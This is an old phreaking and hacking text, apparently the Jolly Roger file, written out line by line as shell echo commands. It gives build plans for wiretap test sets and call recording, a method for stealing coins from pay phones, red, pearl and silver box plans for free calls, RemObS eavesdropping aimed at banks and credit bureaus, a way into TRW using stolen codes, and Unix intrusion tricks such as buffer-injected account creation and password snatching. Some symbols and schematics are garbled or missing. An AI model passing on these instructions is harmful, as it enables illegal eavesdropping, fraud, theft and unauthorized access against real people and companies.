echo Well, now you can consider yourself a minor expert on the terminals and wiring of the local telephone network. Now you can apply it to 
echo whatever you want to do.. Here's another helpful item:
echo How to make a Basic Test-Set and how to use it to dial out, eavesdrop, or seriously tap and record line activity. These are the (usually) orange 
echo hand set fones used by Telco technicians to test lines. To make a very simple one, take any Bell (or other, but I recommend a good Bell fone like 
echo a princess or a trimline. GTE flip fones work excellently, though..) fone and follow the instructions below.
echo Note: A 'black box' type fone mod will let you tap into their line, and with the box o, it's as if you weren't there. They can receive calls and dial 
echo out, and you can be listening the whole time Very useful. With the box off, you have a normal fone test set.
echo Instructions:
echo A basic black box works well with good results. Take the cover off the fone to expose the network box (Bell type fones only). The <RR> 
echo terminal should have a green wire going to it (orange or different if touch tone - doesn't matter, its the same thing). Disconnect the wire and 
echo connect it to one pole of an SPST switch. Connect a piece of wire to the other pole of the switch and connect it to the <RR> terminal. Now 
echo take a 10kohm « watt 10% resistor and put it between the <RR> terminal ad the <F> terminal, which should have a blue and a white wire going 
echo to it (different for touch tone). It should look like this:
echo -----Blue wire----------<F>
echo  
echo ----White wire-----
echo  
echo  10k Resistor
echo  
echo  
echo --Green wire -- ----<RR>
echo  
echo  SPST
echo What this does in effect is keep the hookswitch / dial pulse switch (F to RR loop) open while holding the line high with the resistor. This gives 
echo the same voltage effect as if the fone was 'on-hook', while the 10k ohms holds the voltage right above the 'off hook' threshold (around 22 volts 
echo or so, as compared to 15-17 or normal off hook 48 volts for normal 'on-hook'), giving Test Set Version 2.
echo Another design is similar to the 'Type 1' test set (above), but has some added features:
echo From >----------------Tip------<To Test
echo Alligator set
echo Clip >----------------Ring-----<phone
echo  
echo  x 
echo  
echo  o 
echo  
echo  
echo  
echo  x----0------
echo x = Spst Switch
echo o = Red LOD 0 = Green LED
echo RRRRR= 1.8k « watt xxxx= Dpst switch
echo  resistor
echo When the SPST switch in on, the LED will light, and the fone will become active. The green light should be on. If it isn't, switch the dpst. If it still 
echo isn't, check the polarity of the line and the LEDs. With both lights on, hang up the fone. They should all be off now. Now flip the dpst and pick up 
echo the fone. The red LED should be on, but the green shouldn't. If it is, something is wrong with the circuit. You wont get a dial tone if all is correct. 
echo When you hook up to the line with the alligator clips (Assuming you have put this circuit inside our fone and have put alligator clips on the ring 
echo and tip wires (As we did before)) you should have the spst #1 in the off position. This will greatly reduce the static noise involved in hooking 
echo up to a line. The red LED can also be used to check if you have the correct polarity. With this fone you will have the ability to listen in on all 
echo audible line activity, and the people (the 'eavesdroppers')
echo can use their fone as normal. Note that test sets #1 and #2 have true 'black boxes', and can be used for free calls (see an article about black 
echo boxes).
echo Test Set Version 3 
echo Using a trimline (or similar) phone, remove the base and cut all of the wire leads off except for the red (ring -) and the green (tip +). Solder 
echo alligator clips to the lug. The wire itself is 'tinsel' wrapped in rayon, and doesn't solder well. Inside the one handset, remove the light socket (if it 
echo has one) and install a small slide or toggle switch (Radio Shack's micro-miniature spst works well). Locate the connection of the ring and the tip 
echo wires on the PC board near where the jack is located at the bottom of the handset. (The wires are sometimes black or brow instead of red and 
echo green, respectively). Cut the foil and run 2 pieces of wire to your switch. In parallel with the switch add a ¬ uf 200 VDC capacitor (mylar, 
echo silvered mica, ceramic, not an electrolytic). When the switch is closed, the handset functions normally. With the switch in the other position, 
echo you can listen without being heard.
echo Note: To reduce the noise involved in connecting the clips to a line, add a switch selectable 1000 ohm « watt resistor in series with the tip wire. 
echo Flip it in circuit when connecting, and once on the line, flip it off again. (or just use the 'line disconnect' type switch as in the type 2 test set 
echo (above)). Also avoid touching the alligator clips to any metal parts or other terminals, for I causes static on the line and raises people's 
echo suspicions.
echo RECORDING
echo If you would like to record any activity, use test set 1 or 2 above (for unattended recording of all line activity), or just any test set if you are 
echo going to be there to monitor when they are dialing, talking, etc. Place a telephone pickup coil (I recommend the Becoton T-5 TP coil or equivalent) 
echo onto the test set, and put the TP plug into the mic. jack of any standard tape recorder. Hit play, rec, and pause. Alternate pause when you want 
echo to record (I don't think anyone should have any difficulty with this at all...) Well, if you still can't make a test set or you don't have the parts, 
echo there's still hope. 
echo Alternate methods:
echo 1.Find a bell test set in a manhole or a bridging head and 'Borrow it indefinitely'...
echo 2.Test sets can be purchased from:
echo Techni-Tool
echo 5 Apollo Road
echo Box 368
echo Plymouth Meeting PA., 19462
echo Ask for catalog #28
echo They are usually $300 - $600, and are supposed to have M-F dialing capability as well as TT dialing. They are also of much higher quality than 
echo the standard bell test sets. If you would like to learn more about the subjects covered here, I suggest:
echo 1.Follow Bell trucks and linemen or technicians and ask subtle questions. also try 611 (repair service) and ask questions..
echo 2.Explore your area for any Bell hardware, and experiment with it. Don't try something if you are not sure what you're doing, because you 
echo wouldn't want to cause problems, would you?

echo 95. Getting Money out of Pay Phones by The Jolly Roger
echo I will now share with you my experiences with pay telephones. You will discover
echo that it is possible to get money from a pay phone with a minimum of effort. Theory: Most pay phones use four wires for the transmission of 
echo data and codes to the central office. Two of them are used for voice (usually red and green), one is a ground, and the last is used with the 
echo others for the transmission of codes.
echo It is with this last wire that you will be working with. On the pay phone that I usually did this to, it was colored purple, but most likely will be 
echo another color. What you will do is simply find a pay phone which has exposed wires, such
echo that one of them can be disconnected and connected at ease without fear of discovery. You will discover that it is usually a good idea to have 
echo some electrical tape along with you and some tool for cutting this tape. Through trial and error, you will disconnect one wire at a time starting 
echo with the wires different than green and red. You do want a dial tone during this operation. What you want to disconnect is the wire supplying 
echo the codes to the telephone company so that the pay phone will not get the 'busy' or 'hang-up' command. Leave this wire disconnected when 
echo you discover it. What will happen: Anytime that someone puts any amount of money into the pay phone, the deposit will not register with the 
echo phone company and it will be held in the 'temporary' chamber of the pay phone. Then, (a day later or so) you just come back to the phone, 
echo reconnect the wire, and click the hook a few times and the phone will dump it all out the chute. (What is happening is that the 'hang-up' code 
echo that the phone was not receiving due to the wire being disconnected suddenly gets the code and
echo dumps its' 'temporary' storage spot.) You can make a nice amount of money this way, but remember that a repairman will stop by every few 
echo times it is reported broken and repair it, so check it at least once a day. Enjoy and have fun.. Many phones I have done this to, and it works well 
echo with each..

echo 96. Computer Based PBX by The Jolly Roger
echo To get a better understanding of what a pbx can do, here are a few basic fundamentals. The modern pbx is a combined computer, mass 
echo storage device, and of course a switching system that can:
echo 1.Produce itemized, automated billing procedures, to allow the identification and management of toll calls. [hahaha]
echo 2.Combine daytime voice grade communication circuits into wideband data channels for night time high speed data transfers.
echo 3.Handles electronic mail [including office memos].
echo 4.Combine voice channels into a wideband audio/visual conference circuit, with the ability to xfer and capture slides, flipcharts, pictures of any 
echo kind.
echo Both the external and internal calling capacity of the pbx system must be carefully considered because many business operations run a very 
echo high ratio of internal station to station dialing and a low capacity system will not handle the requested traffic load. A critical factor is the number 
echo of trunks and the central office facilities that are used for outside connections. Another is the number of junctions or [links] that make up the 
echo internal calling paths. To understand the services available on a typical computer run pbx it is necessary to introduce the subject of time 
echo division switching. In a time division switching network all connections are made via a single common bus called (of course) a 'time-division 
echo bus'. Every line trunk that requires a connection with another is provided with a port circuit. All port circuits have access to the time division 
echo bus through a time division switch. [when two ports require connection, their time division switches operate at a very high frequency (16,000 
echo times per second.) This technique, which is called 'speech sampling', allows many simultaneous connections over the same time division bus. 
echo Each connection is assigned a time interval, the 'time slot', and the number of time slots identifies the number of simultaneous connections 
echo among ports.] The next critical item is circuit packs. The system elements that we will be describing in future tutorials [lines/trunks/switches, 
echo memory and control] are contained on plug in circuit packs. Each line circuit pack contains a number of lines, in example, four. But the 
echo assignment of station numbers to actual phone line circuits is flexible. The system memory is contained in circuit packs which provide the call 
echo processing functions. The circuit packs are held in small frames called 'carriers'. Within each carrier, the circuit packs are plugged into 
echo positions: the 'slots'. Every circuit can be addressed by, say a five digit number which tells its location by carrier-slot-circuit.... [starting to get 
echo the idea?] There can be three types of carriers in a modern pbx system:
echo · O line carriers
echo · 0 trunk carriers
echo · O control carriers
echo The line carriers contain station lines. In ATandT's "dimension" model, for example, a total of 52 to 64 lines are provided. The trunk carriers contain 
echo slots for 16 trunk circuit packs. The control carrier includes processor, memory, control circuitry, data channels for attendant console control 
echo and traffic measurement outputs. Pbx systems will directly reflect the types of services offered at the c.o.
echo  o ccsa
echo  o ccis
echo  o picturephones [sooner than you think my phriends]
echo Common control switching arrangements (ccsa) permit any unrestricted telephone station to call any other internal or external system station 
echo by using the standard seven digit number. Alternate routing is a feature of ccsa service the inter-facility, alternate routed calling paths are 
echo accomplished at the telephone company central office level, not at the pbx level. A system of interest to large scale telephone users is common 
echo channel interoffice signaling ccis. Typically, this technique employs common channels to carry all inter-facility signaling instructions: dial pulses, 
echo on hook (idle), off hook (busy),and so on, between two switching centers. [getting warm]. Ccis replaces older methods of interoffice signaling 
echo such as 'in band' and 'out of band' techniques. By the way, real phreaks are selling their boxes to idiots who still think they're worth a lot...the 
echo former (in band) transmits signaling data within the normal conversation bandwidth. It’s shortcoming is that false information may be transmitted 
echo due to unique tone or noise combinations set up in the talking path. [this is the official reasoning]. Out of band signaling techniques placed the 
echo interoffice data in special channels, generally adjacent to and immediately above the voice path. To preserve interchannel integrity, out of band 
echo signaling requires very efficient filtering or greater 'band guard' separation between channels.

echo 97. PC-Pursuit Port Statistics by PC-Pursuit Users
echo Introduction:
echo The last 30 days of PC-Pursuit have been extremely controversial. Users and ex-users have demanded accurate statistics, and Telenet has 
echo provided us with very little. And the data that was provided is questionable. Well, here is some data that is guaranteed to be accurate and 
echo make Telenet scream. If you wish to update this data on your own, we will tell you how later in this text. The following chart consists of all the 
echo direct Telenet addresses of the PC-Pursuit city nodes and the total number of modems on each node. Here is what the data means:
echo  NJNEW/3 2011 .12 56
echo    \-- Total Number of Modems in NJNEW
echo    \- Last Working Suffix of Address sequence.
echo   \- Direct Telenet Address Prefix.
echo   \--- Baud Rate of This Port is 300.
echo  \--------- Mnemonic.
echo Please note that there are several perfectly legal ways to connect to a PC-Pursuit port such as NJNEW/3:
echo Ways To Connect to NJNEW/3:
echo 1.C D/NJNEW/3,PCP10000,<password> [HUNT]
echo 2.C 2011,PCP10000,<password> [HUNT]
echo 3.C 2011.10,PCP10000,<password> [NON HUNT]
echo  
echo The first, is self explanatory. The second does the same thing as the first, only that it is slightly faster and gives the user much greater 
echo flexibility. The third is an example the flexibility, because a request is made to connect to the tenth, and only the tenth, modem on the NJNEW/3 
echo port. By simply attempting to connect to every single modem in the 2011 chain, we were able to count the number of modems on each port and 
echo come up with the following charts which were extracted on June the twenty ninth of the year 1989:

echo I think the statistics basically speak for themselves. I am sure there will no doubt be hundreds of people who will not smile at the number of 
echo specific kinds of ports supported, not to mention the number of 'dead' or 'down' modems you will find when you verify the totals. Usually, 2% to 
echo perhaps 10% of the modems are 'dead' with specific ones repeatedly failing week after week.
echo History Of This Collection:
echo Almost a year ago a small selected group of devoted individuals got together to discuss problems with the PC-Pursuit Network, in the middle of 
echo our discussions a question was asked as to how the network really processes our calls. This was intended to help us assess SET commands 
echo and other such matters. When the address hypothesis was offered we quickly set out to prove it. It was proved in about 3 minutes with the 
echo discovery of 2011 (First try was xxx1). The data has continually been collected and analyzed ever since, but until now, has never been mass 
echo released.
echo  
echo A small group of teen age hackers discovered several interesting things that can be done with these addresses -- many of which will not be 
echo discussed here short of mentioning that these ports connected to via these addresses are not limited to PC-Pursuiters. You can, however, 
echo fight "dead" dialout modems in cities via the address method. Dead modems can be located in about 10 seconds (faster than Telenet), and can 
echo either be reported or skipped past by the user connecting to the next modem in the sequence after the "dead" one. (Note: Say 2011.3 is dead, 
echo connect to 2011.4 and you will be past it. If 2011.4 is busy, go to 2011«. The reader should notice 2011.3 is the same as 2011C.)
echo  
echo The most interesting value of these addresses is that one can count the number of ports that Telenet keeps so secret (Grin). When there 
echo were only 28 cities in operation there were an average of 2.7 300 baud, 9.4 1200 baud, and 2« 2400 baud modems in each city. Some cities 
echo had as little as 2 modems on a port and as many as 12. Only recently has the number of modems per city begun to jump.
echo  
echo How To Update The Count Yourself:
echo An ID is not required to "request" one of these ports, thus the tallying can be done any time of day by simply typing the number at the @ 
echo prompt. Here is an example with four modems (NJNEW/24):
echo  @20122.1
echo  201 22A REFUSED COLLECT CONNECTION 19 80
echo  @20122.2
echo  201 22B REFUSED COLLECT CONNECTION 19 80
echo  @20122.3
echo  201 22C REFUSED COLLECT CONNECTION 19 80
echo  @20122.4
echo  201 22D REFUSED COLLECT CONNECTION 19 80
echo  @20122«
echo  201 22E ILLEGAL ADDRESS 19 80
echo The reader should be aware that PC-Pursuit ports always respond with '19 80'. Do not confuse it with '19 00', which are not PC-Pursuit ports. 
echo In the above example we know there are four ports because the forth was the last existing port before we encountered the 'ILLEGAL 
echo ADDRESS.' There are several ways to signify that you have gone one beyond the end of the ports:
echo 1.xxx xxx ILLEGAL ADDRESS 19 80
echo 2.xxx xxx NOT OPERATING 19 80
echo 3.The request freezes (Note: Issue a BREAK then D <C/R> to abort the attempt yielding 'ATTEMPT ABORTED'.)
echo You should be aware that modems which are out of order in the middle of the sequence can respond with 'NOT OPERATING' or may freeze 
echo the request. You should also note that when updating the existing list, all you need to do is try to request the next modem beyond the end as of 
echo the last check.
echo  
echo Finding Newly Added Ports:
echo Many ports have not yet been installed; hence, we do not yet know the addresses. New ports may be found by entering the first three digits 
echo of the area code and appending (1-29, 101-129, 201-229, 301-329, etc.) until the 'REFUSED COLLECT CONNECTION 19 80' appears. Once 
echo this is found, simply log onto the port address with your ID and R/V dial some silly series of digits, disconnect the port, then connect to the PCPursuit mnemonic you think it might be and R/V redial the last number. If the numbers match, you found it.

echo 98. Pearl Box Plans by The Jolly Roger
echo The Pearl Box: Definition - This is a box that may substitute for many boxes which produce tones in hertz. The Pearl Box when operated 
echo correctly can produce tones from 1-9999hz. As you can see, 2600, 1633, 1336 and other crucial tones are obviously in its sound spectrum.
echo Materials you will need:
echo 1.C1, C2:«mf or «uf ceramic disk capacitors
echo 2.Q1.....NPN transistor (2N2222 works best)
echo 3.S1.....Normally open momentary SPST switch
echo 4.S2.....SPST toggle switch
echo 5.B1.....Standard 9-Volt battery
echo 6.R1.....Single turn, 50k potentiometer
echo 7.R2.....Single turn, 100k potentiometer
echo 8.R3.....Single turn, 500k potentiometer
echo 9.R4.....Single turn, 1Meg potentiometer
echo 10.SPKR...Standard 8-ohm speaker
echo 11.T1.....Mini transformer (8-ohm works best)
echo 12.Misc...Wire, solder, soldering iron, PC board or perfboard, box to contain the completed unit, battery clip
echo Instructions for building Pearl Box:
echo Since the instruction are EXTREMELY difficult to explain in words, you will be given a schematic instead. It will be quite difficult to follow but try 
echo it any way.

echo Now that you are probably thoroughly confused, let me explain a few minor details. The potentiometer area is rigged so that the left pole is 
echo connected to the center pole of the potentiometer next to it. The middle terminal of T1 is connected to the piece of wire that runs down to the 
echo end of the battery.
echo Correct operation of The Pearl Box:
echo You may want to get some dry-transfer decals at Radio Shack to make this job a lot easier. Also, some knobs for the tops of the 
echo potentiometers may be useful too. Use the decals to calibrate the knobs. R1 is the knob for the ones place, R2 is for the tens place, R3 if for the 
echo hundreds place and R4 is for the thousands place. S1 is for producing the all the tones and S2 is for power.
echo 1.Turn on the power and adjust the knobs for the desired tone.
echo (Example: For 2600 hz-R1=0:R2=0:R3=6:R4=2)
echo 2.Hit the push-button switch and VIOLA You have the tone. If you don't have a tone recheck all connections and schematic.

echo Here are a few tips on how not to get caught when using MCI or other such services:
echo 1.Try not to use them for voice to voice personal calls. Try to use them for computer calls only. Here is why:
echo MCI and those other services can't really trace the calls that come through the lines, they can just monitor them. They can listen in on your calls 
echo and from that, they can get your name and other information from the conversation. They can also call the number you called and ask your 
echo friend some questions. If you call terminals and BBS'S then it is much harder to get information. For one thing, most sysops won't give 
echo these dudes that call any info at all or they will act dumb because they PHREAK themselves
echo 2.Beware when using colored boxes
echo 3.Try to find a sine-wave number. Then use an MCI or other service to call it. You will hear a tone that goes higher and lower. If the tone just 
echo stops, then that code is being monitored and you should beware when using it.
echo If you do get caught, then if you think you can, try to weasel out of it. I have heard many stories about people that have pleaded with the MCI 
echo guys and have been let off. You will get a call from a guy that has been monitoring you. Act nice. Act like you know it is now wrong to do this 
echo kind of thing.....just sound like you are sorry for what you did. (If you get a call, you probably will be a little sorry) Otherwise, it is very 
echo dangerous)

echo 100.Red Box Plans by The Jolly Roger
echo Red boxing is simulating the tones produced by public payphones when you drop your money in. The tones are beeps of 2200Hz + 1700Hz a 
echo nickle is 1 beep for 66 milliseconds. A dime is 2 beeps, each 66 milliseconds with a 66 millisecond pause between beeps. A quarter is 5 beeps, 
echo each 33 milliseconds with a 33 millisecond pause between beeps.
echo There are two commonly used methods being used by Phreaks to make free calls.
echo 1.An electronic hand-held device that is made from a pair of Wien-bridge oscillators with the timing controlled by 555 timing chips.
echo 2.A tape recording of the tones produced by a home computer. One of the best computers to use would be an Atari ST. It is one of the easier 
echo computers to use because the red box tones can be produced in basic with only about 5 statements.

echo 101.RemObS by The Jolly Roger
echo Some of you may have heard of devices called Remobs which stands for Remote Observation System. These Devices allow supposedly 
echo authorized telephone employees to dial into them from anywhere, and then using an ordinary touch tone fone, tap into a customer's line in a 
echo special receive only mode. 'The mouthpiece circuit is deactivated, allowing totally silent observation from any fone in the world ''Wire tapping 
echo without a court order is against the law'''
echo How Remobs Work
echo Dial the number of a Remob unit. Bell is rumored to put them in the 555 information exchanges, oron special access trunks 'Unreachable except 
echo via blue box'. A tone will then be heard for approximately 2 seconds and then silence. You must key in 'In DTMF' a 2 to 5 digit access code 
echo while holding each digit down at least 1 second. If the code is not entered within 5 or 6 seconds, the Remob will release and must be dialed 
echo again. If the code is supposedly another tone will be heard. A seven digit subscriber fone number can then be entered [The Remob can only 
echo handle certain 'exchanges' which are prewired, so usually one machine cannot monitor an entire NPA]. The Remob will then connect to the 
echo subscribers line. The listener will hear the low level idle tone as long as the monitored party is on hook. As the monitored party dials 'rotary or 
echo DTMF', the listener would hear 'And Record' the number being dialed. Then the ENTIRE conversation, datalink, whatever is taking place, all 
echo without detection. There is no current box which can detect Remob observation, since it is being done with the telephone equipment that 
echo makes the connection. When the listener is finished monitoring of that particular customer, he keys the last digit of the access code to 
echo disconnects him from the monitored line and return to the tone so that he can key in another 7 digit fone number. When the listener is totally 
echo finished with the Remob, he keys a single 'disconnect digit' which disconnects him from the Remob so that the device can reset and be ready 
echo for another caller.
echo History of Remobs
echo Bell has kept the existence of Remobs very low key. Only in 1974, Bell acknowledged that Remobs existed. The device was first made public 
echo during hearings on "Telephone Monitoring Practices by Federal Agencies" before a subcommittee on government operations. House of 
echo Representatives, Ninety-Third Congress, June 1974. It has since been stated by Bell that the Remob devices are used exclusively for 
echo monitoring Bell employees such as operators, information operators, etc., to keep tabs on their performance. 'Suuureee, were stupid'
echo Possible Uses for Remobs
echo  The possible uses of Remobs are almost as endless as the uses of self created fone line. Imagine the ability to monitor bank lines etc, just 
echo off the top of my head I can think of these applications:
echo Data Monitoring of:
echo · TRW
echo · National Credit Bureau.
echo · ATandT Cosmos.
echo · Bank Institutions.
echo · CompuServe and other Networks.
echo Voice Monitoring of:
echo · Bank Institutions.
echo · Mail Order businesses.
echo · Bell Telephone themselves.
echo · Any place handling sensitive or important information.
echo · Anyone that you may not like.
echo  With just one Remob, someone could get hundreds of credit cards, find out who was on vacation, get CompuServe passwords by the 
echo dozens, disconnect peoples fones, do credit checks, find out about anything that they may want to find out about. I'm sure you brilliant can 
echo see the value of a telephone hobbyist and a telecommunications enthusiast getting his hands on a few choice Remobs.
echo Caution
echo If any reader should discover a Remob during his 'or her' scanning excursions, please keep in mind the very strict federal laws regarding 
echo wiretapping and unauthorized use of private Bell property.

echo 103.Silver Box Plans by The Jolly Roger
echo Introduction:
echo First a bit of Phone Trivia. A standard telephone keypad has 12 buttons. These buttons, when pushed, produce a combination of two tones. 
echo These tones represent the row and column of the button you are pushing.
echo  1 1 1
echo  2 3 4
echo  0 3 7
echo  9 6 7
echo  697 (1) (2) (3)
echo  770 (4) (5) (6)
echo  851 (7) (8) (9)
echo  941 (*) (0) (#)
echo So (1) produces a tone of 697+1209, (2) produces a tone of 697+1336, etc.
echo Function:
echo What the Silver Box does is just creates another column of buttons, with the new tone of 1633. These buttons are called A, B, C, and D.
echo Usefulness:
echo Anyone who knows anything about phreaking should know that in the old days of phreaking, phreaks used hardware to have fun instead of 
echo other people's Sprint and MCI codes. The most famous (and useful) was the good ol' Blue Box. However, Ma Bell decided to fight back and 
echo now most phone systems have protections against tone-emitting boxes. This makes boxing just about futile in most areas of the United States 
echo (i.e. those areas with Crossbar or Step-By-Step). If you live in or near a good-sized city, then your phone system is probably up-to-date (ESS) 
echo and this box (and most others) will be useless. However, if you live in the middle of nowhere (no offense intended), you may find a use for 
echo this and other boxes.
echo Materials:
echo · 1 Foot of Blue Wire
echo · 1 Foot of Gray Wire
echo · 1 Foot of Brown Wire
echo · 1 Small SPDT Switch (*)
echo · 1 Standard Ma Bell Phone
echo (*)SPDT = Single Pole/Double Throw
echo Tools:
echo · 1 Soldering Iron
echo · 1 Flat-Tip Screwdriver
echo Procedure:
echo 1.Loosen the two screws on the bottom of the phone and take the casing off.
echo 2.Loosen the screws on the side of the keypad and remove the keypad from the mounting bracket.
echo 3.Remove the plastic cover from the keypad.
echo 4.Turn the keypad so that *0# is facing you. Turn the keypad over. You'll see a bunch of wires, contacts, two Black Coils, etc.
echo 5.Look at the Coil on the left. It will have five (5) Solder Contacts facing you. Solder the Gray Wire to the fourth Contact Pole from the left.
echo 6.Solder the other end of the Gray Wire to the Left Pole of the SPDT Switch.
echo 7.Find the Three (3) Gold-Plated Contacts on the bottom edge of the keypad. On the Left Contact, gently separate the two touching Connectors 
echo (they're soldered together) and spread them apart.
echo 8.Solder the Brown Wire to the Contact farthest from you, and solder the other end to the Right Pole of the SPDT Switch.
echo 9.Solder the Blue Wire to the Closest Contact, and the other end to the Center Pole of the SPDT Switch.
echo 10.Put the phone back together.
echo Using The Silver Box:
echo What you have just done was installed a switch that will change the 369# column into an ABCD column. For example, to dial a 'B', switch to 
echo Silver Box Tones and hit '6'.
echo  No one is sure of the A, B, and C uses. However, in an area with an old phone system, the 'D' button has an interesting effect. Dial 
echo Directory Assistance and hold down 'D'. The phone will ring, and you should get a pulsing tone. If you get a pissed-off operator, you have a 
echo newer phone system with defenses against Silver Boxes. At the pulsing tone, dial a 6 or 7. These are loop ends.

echo 104.Bell Trashing by The Jolly Roger
echo The Phone Co. will go to extremes on occasions. In fact, unless you really know what to expect from them, they will surprise the heck out of 
echo you with their "unpublished tariffs". Recently, a situation was brought to my attention that up till then I had been totally unaware of, least to 
echo mention, had any concern about. It involved garbage The phone co. will go as far as to prosecute anyone who rummages through their 
echo garbage and helps himself to some
echo Of course, they have their reasons for this, and no doubt benefit from such action. But, why should they be so picky about garbage? The 
echo answer soon became clear to me: those huge metal bins are filled up with more than waste old food and refuse... Although it is Pacific Tele. 
echo policy to recycle paper waste products, sometimes employees do overlook this sacred operation when sorting the garbage. Thus top-secret 
echo confidential Phone Co. records go to the garbage bins instead of the paper shredders. Since it is constantly being updated with "company 
echo memorandums, and supplied with extensive reference material, the Phone co. must continually dispose of the outdated materials. Some phone 
echo companies are supplied each year with the complete "System Practices" guide. This publication is an over 40 foot long library of reference 
echo material about everything to do with telephones. As the new edition arrives each year, the old version of "System Practices" must also be 
echo thrown out.
echo I very quickly figured out where some local phone phreaks were getting their material. They crawl into the garbage bins and remove selected 
echo items that are of particular interest to them and their fellow phreaks. One phone phreak in the Los Angeles area has salvaged the complete 
echo 1972 edition of "Bell System Practices". It is so large and was out of order (the binders had been removed) that it took him over a year to sort it 
echo out and create enough shelving for it in his garage.
echo Much of this "Top Secret" information is so secret that most phone companies have no idea what is in their files. They have their hands full 
echo simply replacing everything each time a change in wording requires a new revision. It seems they waste more paper than they can read
echo It took quite a while for Hollywood Cal traffic manager to figure out how all of the local phone phreaks constantly discovered the switchroom 
echo test numbers.
echo Whenever someone wanted to use the testboard, they found the local phone phreaks on the lines talking to all points all over the world. It got to 
echo the point where the local garbage buffs knew more about the office operations than the employees themselves. One phreak went so far as to 
echo call in and tell a switchman what his next daily assignment would be. This, however, proved to be too much. The switchman traced the call 
echo and one phone phreak was denied the tool of his trade.
echo In another rather humorous incident, a fellow phreak was rummaging through the trash bin when he heard someone approaching. He pressed 
echo up against the side of the bin and silently waited for the goodies to come. You can imagine his surprise when the garbage from the lunchroom 
echo landed on his head. Most people find evenings best for checking out their local Telco trash piles. The only thing necessary is a flashlight and, in 
echo the case mentioned above, possibly a rain coat. A word of warning though, before you rush out and dive into the trash heap. It is probably 
echo illegal, but no matter where you live, you certainly won't get the local policeman to hold your flashlight for you.

echo 106.Hacking TRW by The Jolly Roger
echo  When you call TRW, the dial up will identify itself with the message
echo "TRW". It will then wait for you to type the appropriate answer back 'such as CTRL-G' Once This has been done, the system will say "CIRCUIT 
echo BUILDING IN PROGRESS" Along with a few numbers. After this, it clears the screen 'CTRL L' followed by a CTRL-Q. After the system sends 
echo the CTRL-Q, It is ready for the request. You first type the 4 character identifier for the geographical area of the account..
echo 'For Example' TCA1 - for certain Calif. and Vicinity subscribers.
echo TCA2 - A second CALF. TRW System.
echo TNJ1 - Their NJ Database.
echo TGA1 - Their Georgia Database.
echo The user then types A 'CR' and then on the next line, he must type his 3 char. Option. Most Requests use the RTS option. OPX, RTX, and a 
echo few others exist. 'NOTE' TRW will accept an A, C, or S as the 'X' in the options above.' Then finally, the user types his 7 digit subscriber code. 
echo He appends his 3-4 character password after it. It seems that if you manage to get hold of a TRW Printout 'Trashing at Sears, Saks, ETC. or 
echo from getting your credit printout from them' Their subscriber code will be on it leaving only a 3-4 character p/w up to you.
echo For Example,
echo 'Call the DialUp'

echo 'You type, YT' Circuit building in progress 1234
echo (ST' CTRL-L CRTL-Q 'TCA1 CYT' BTS 3000000AAA
echo 'CR''CRTL-S' 'YT'
echo Note: This system is in Half Duplex, Even Parity, 7 Bits per word and 2 Stop Bits.
echo CAUTION: It is a very stressed rumor that after typing in the TRW password Three '3' times.. It sets an Automatic Number Identification on your

echo 107.Hacking Vax's and Unix by The Jolly Roger
echo  Unix is a trademark of ATandT 'and you know what that means'
echo In this article, we discuss the unix system that runs on the various vax systems. If you are on another unix-type system, some commands 
echo may differ, but since it is licensed to bell, they can't make many changes.
echo Hacking onto a unix system is very difficult, and in this case, we advise having an inside source, if possible. The reason it is difficult to hack a 
echo vax is this: Many vax, after you get a carrier from them, respond''=>''
echo Login:
echo They give you no chance to see what the login name format is. Most commonly used are single words, under 8 digits, usually the person's 
echo name. There is a way around this: Most vax have an acct. called 'suggest' for people to use to make a suggestion to the system root terminal. 
echo This is usually watched by the system operator, but at late he is probably at home sleeping or screwing someone's brains out. So we can 
echo write a program to send at the vax this type of a message: A screen freeze 'Cntl-S', screen clear 'system dependant', about 255 garbage 
echo characters, and then a command to create a login acct., after which you clear the screen again, then unfreeze the terminal. What this does: 
echo When the terminal is frozen, it keeps a buffer of what is sent. Well, the buffer is about 127 characters long. so you overflow it with trash, and 
echo then you send a command line to create an acct. 'System dependant'. After this you clear the buffer and screen again, then unfreeze the 
echo terminal. This is a bad way to do it, and it is much nicer if you just send a command to the terminal to shut the system down, or whatever you 
echo are after... There is always, *Always* an acct. called root, the most powerful acct. to be on, since it has all of the system files on it. If you 
echo hack your way onto this one, then everything is easy from here on... On the unix system, the abort key is the Cntl-D key. Watch how many 
echo times you hit this, since it is also a way to log off the system The root directory, called root, is where the 
echo system resides. After this come a few 'sub' root directories, usually to group things 'stats here, priv stuff here, the user log here...'. Under 
echo this comes the superuser 'the operator of the system', and then finally the normal users. In the unix 'Shell' everything is treated the same.
echo By this we mean: You can access a program the same way you access a user directory, and so on. The way the unix system was written, 
echo everything, users included, are just programs belonging to the root directory. Those of you who hacked onto the root, smile, since you can 
echo screw everything...the main level 'exec level' prompt on the unix system is the $, and if you are on the root, you have a # 'superuser prompt'. 
echo Ok, a few basics for the system... To see where you are, and what paths are active in regards to your user account, then type
echo ''=>'' pwd
echo This shows your acct. separated by a slash with another pathname 'acct.', possibly many times. To connect through to another path, or many 
echo paths, you would type:
echo You''=>'' path1/path2/path3
echo And then you are connected all the way from path1 to path3. You can
echo run the programs on all the paths you are connected to. If it does
echo not allow you to connect to a path, then you have insufficient privs, or
echo the path is closed and archived onto tape. You can run programs this way
echo also:
echo you''=>'' path1/path2/path3/program-name
echo Unix treats everything as a program, and thus there a few commands to learn...
echo To see what you have access to in the end path, type:
echo ls
echo for list. This show the programs you can run. You can connect to the root directory and run it's programs with''=>''
echo /root
echo By the way, most unix systems have their log file on the root, so you can set up a watch on the file, waiting for people to log in and snatch 
echo their password as it passes thru the file. To connect to a directory, use the command:
echo ''=>'' cd pathname 
echo This allows you to do what you want with that directory. You may be asked for a password, but this is a good way of finding other user 
echo names to hack onto. The wildcard character in unix, if you want to search down a path for a game or such, is the *.
echo ''=>'' ls /*
echo Should show you what you can access. The file types are the same as they are on a dec, so refer to that section when examining file. To see 
echo what is in a file, use the
echo ''=>'' pr
echo filename command, for print file. We advise playing with pathnames to get the hang of the concept. There is on-line help available on most 
echo systems with a 'help' or a '?'. We advise you look thru the help files and pay attention to anything they give you on pathnames, or the 
echo commands for the system. You can, as a user, create or destroy directories on the tree beneath you. This means that root can kill everything 
echo but root, and you can kill any that are below you. These are the
echo ''=>'' mkdir pathname
echo ''=>'' rmdir pathname
echo commands. Once again, you are not alone on the system... type''=>''
echo who
echo to see what other users are logged in to the system at the time. If you
echo want to talk to them''=>''
echo write username
echo Will allow you to chat at the same time, without having to worry about the parser. To send mail to a user, say
echo ''=>'' mail
echo And enter the mail sub-system. To send a message to all the users on the system, say
echo ''=>'' wall
